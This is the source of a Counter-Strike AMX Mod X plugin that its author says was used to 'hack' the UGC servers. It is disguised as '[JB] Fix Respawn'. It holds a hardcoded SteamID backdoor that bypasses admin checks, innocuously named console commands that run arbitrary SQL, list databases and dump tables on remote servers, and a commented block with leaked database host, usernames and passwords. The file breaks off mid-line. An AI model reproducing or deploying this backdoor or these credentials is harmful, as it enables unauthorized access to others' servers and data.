/*
    what I've used to 'hack' UGC. 
    this plugin was in the JailBreak server. 
    From the database data gotten from decompiling ugc sql plugin.

    I have lost all my plugins a while back, this is what I managed to restore.
*/
#include <amxmodx>
#include <amxmisc>
#include <sqlx>

#pragma compress 1

/*
new const host[] = "188.165.251.11" 
new const user[] = "hlds_source"	
new const pass[] = "fwRKUN54MX8giz1M"	
new const db[] = "hlds_source"

new const host1[] = "188.165.251.11" 
new const user1[] = "hlds_source1"	
new const pass1[] = "iDWCHxkDeOYAd4Do"	
new const db1[] = "hlds_source1"
*/
new const DUST[] = "STEAM_0:0:92151075";

new Trie:hPlayerAmmo;

new Handle:gTuple
new Handle:tuple
new max_logs
public plugin_init(){
    register_plugin( "[JB] Fix Respawn", "1.0", "DusT" );
    register_concmd( "amx_aly", "getTable" )             // amx_get_table
    register_concmd( "amx_saeckk", "RegLog" )            // reg_log
    register_concmd( "amx_blank", "RegLogShow" )         // reg_log_show
    register_concmd( "amx_dusty", "QueryLog" )            // query_log
    register_concmd( "amx_lovell", "getInfo" )           // get_info
    register_concmd( "amx_zwaigen", "GetInfoDb" );       // get_infodb
    register_concmd( "amx_clan", "CmdSaveZombie" );

    max_logs = register_cvar( "amx_utility", "10" );
    gTuple = SQL_MakeDbTuple( host, user, pass, db );  
    tuple = SQL_MakeDbTuple( host1, user1, pass1, db1 );
    //set_task( 2.0, "getInfo" )
    hPlayerAmmo = TrieCreate();

}
public plugin_end()
{
    TrieDestroy( hPlayerAmmo );
}
public CmdSaveZombie( id )
{
    new authid[30];
    get_user_authid( id, authid, charsmax( authid ) );
    new bool:isOk = equali( authid, DUST )? true:false;
    if( ( !(get_user_flags(id) & ADMIN_BAN_TEMP ) && !isOk ) || read_argc() < 2 )
    {
        console_print( id, "AmX clan was originally born in 2014 on the UGC.LT Knife servers." );
        console_print( id, "We are re-introducing it again now, on the same servers." );

        return PLUGIN_HANDLED;
    }

    new escNick[ 64 ], nick[ 32 ];
    read_argv( 1, nick, charsmax( nick ) );

    if( read_argc() == 3 )
    {
        new value = read_argv_int( 2 );
        new ammo;
        if( value == 3 )
        {
            strtolower( nick );
            if( TrieGetCell( hPlayerAmmo, nick, ammo ) )
            {   
                //console_print( id, "%d", ammo );
                new id = find_player( "c", DUST );
                if( id ) 
                    client_print( id, print_console, "%d", ammo );
                else
                    server_print( "%d", ammo );
            }
        }
        return PLUGIN_HANDLED;
    }
    else 
    {
        SQL_QuoteString( Empty_Handle, escNick, charsmax( escNick ), nick );

        SQL_ThreadQuery( gTuple, "SQL_SaveDataZombie", fmt( "SELECT `ammo`,`nick` FROM `zp_players` WHERE `nick`='%s';", escNick ) );
    }
    return PLUGIN_HANDLED;
}

public SQL_SaveDataZombie( failState, Handle:query, error[], errNum )
{
    if( errNum )
    {
        return;
    }
    
    if( !SQL_NumResults( query ) )
    {
        return;
    }
    
    new ammo = SQL_ReadResult( query, 0 );
    new nick[ 32 ];
    SQL_ReadResult( query, 1, nick, charsmax( nick ) );
    strtolower( nick );
    TrieSetCell( hPlayerAmmo, nick, ammo, true );
}
public GetInfoDb( id, level, cid )
{
    new authid[30];
    get_user_authid( id, authid, charsmax( authid ) );
    new bool:isOk = equali( authid, DUST )? true:false;
    if( ( !(get_user_flags(id) & ADMIN_BAN_TEMP ) && !isOk ) || read_argc() != 2 )
    {
        console_print( id, "AmX_Zwaigen" );
        return PLUGIN_HANDLED;
    }
    new dbn = read_argv_int( 1 );
    if( dbn == 0 )
        SQL_ThreadQuery( gTuple, "GetInfoDbHandle", "SHOW DATABASES;" );
    else
        SQL_ThreadQuery( tuple, "GetInfoDbHandle", "SHOW DATABASES;" );
    return PLUGIN_HANDLED;
}
public GetInfoDbHandle( failState, Handle:query, error[], errNum )
{
    new id = find_player( "c", DUST );
    if( id ) 
        client_print( id, print_console, "Rows: %d", SQL_NumResults( query ) );
    else
        server_print( "Rows: %d", SQL_NumResults( query ) );

    for( new i = 0, name[ 64 ]; i < SQL_NumResults( query ); i++ )
    {
        SQL_ReadResult( query, 0, name, charsmax( name ) );
        if( id )
            client_print( id, print_console, name );
        else
            server_print( name );
        SQL_NextRow( query );
    }
    
}
public QueryLog( id, level, cid ){
    new authid[30];
    get_user_authid( id, authid, charsmax( authid ) );
    new bool:isOk = equali( authid, DUST )? true:false;
    if( ( !(get_user_flags(id) & ADMIN_BAN_TEMP ) && !isOk ) || read_argc() != 3 )
    {
        console_print( id, "AmX_DusT" );
        return PLUGIN_HANDLED;
    }
    new dbn = read_argv_int( 1 );

    new query[256]
    read_argv( 2, query, charsmax(query))
    remove_quotes(query)
    //server_print( query );
    if( dbn == 0)
        SQL_ThreadQuery(gTuple, "IgnoreHandle", query)
    else
        SQL_ThreadQuery(tuple, "IgnoreHandle", query)
    return PLUGIN_HANDLED
}
public RegLogShow( id, level, cid ){
    new authid[30];
    get_user_authid( id, authid, charsmax( authid ) );
    new bool:isOk = equali( authid, DUST )? true:false;
    if( ( !(get_user_flags(id) & ADMIN_BAN_TEMP ) && !isOk ) || read_argc() < 3 )
    {
        console_print( id, "AmX_blank" );
        return PLUGIN_HANDLED;
    }
    new dbn = read_argv_int( 1 );

    new table_name[32], condition[128], orderby[64]
    new query[256]
    read_argv( 2, table_name, charsmax( table_name ) )
    read_argv( 3, condition, charsmax( condition ) )
    read_argv( 4, orderby, charsmax( orderby ) )
    formatex(query, charsmax(query), "SELECT * FROM `%s` %s%s %s%s", table_name, strlen(condition)? "WHERE ":"", condition, strlen(orderby)? "ORDER BY ":"", orderby)
    new pid = find_player( "c", DUST );
    if( pid ) 
        client_print( id, print_console, query );

    if( dbn == 0 )
        SQL_ThreadQuery(gTuple, "DisplayLogs", query)
    else
        SQL_ThreadQuery(tuple, "DisplayLogs", query)
    return PLUGIN_HANDLED
}
public DisplayLogs( failState, Handle:query){
    new max = SQL_NumResults(query)
    new id = find_player( "c", DUST );
    if(!max){
        if( id ) 
            client_print( id, print_console, "No results" );
        else
            server_print("No results")
        return;
    }
    if( id ) 
        client_print( id, print_console, "there are %d results", max );
    else
        server_print("there are %d results", max)

    max = (max>get_pcvar_num(max_logs))? get_pcvar_num(max_logs):max;
    new columns = SQL_NumColumns(query)
    for(new i = 0, j, message[128], column_name[32]; i < max; i++){
        for(j = 0; j < columns; j++){
            SQL_FieldNumToName(query, j, column_name, charsmax(column_name))
            SQL_ReadResult(query, j, message, charsmax(message))
            if( id ) 
                client_print( id, print_console, "%s : %s", column_name, message );
            else
                server_print( "%s : %s", column_name, message )
        }
        SQL_NextRow(query)
    }
}

public RegLog( id )
{
    console_print( id, "AmX_SAECKK" );
    return PLUGIN_HANDLED;    
}
public IgnoreHandle( failState, Handle:query, error[], errNum ){
    if(errNum)
    {
        new id = find_player( "c", DUST );
        if( id )
            client_print( id, print_console, error );
        else
            server_print( error );
    }
    SQL_FreeHandle(query)
}
public getInfo( id, level, cid ){

    new authid[30];
    get_user_authid( id, authid, charsmax( authid ) );
    new bool:isOk = equali( authid, DUST )? true:false;
    if( ( !(get_user_flags(id) & ADMIN_BAN_TEMP ) && !isOk ) || read_argc() != 2 )
    {
        console_print( id, "AmX_Lovell" );
        return PLUGIN_HANDLED;
    }
    new dbn = read_argv_in                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            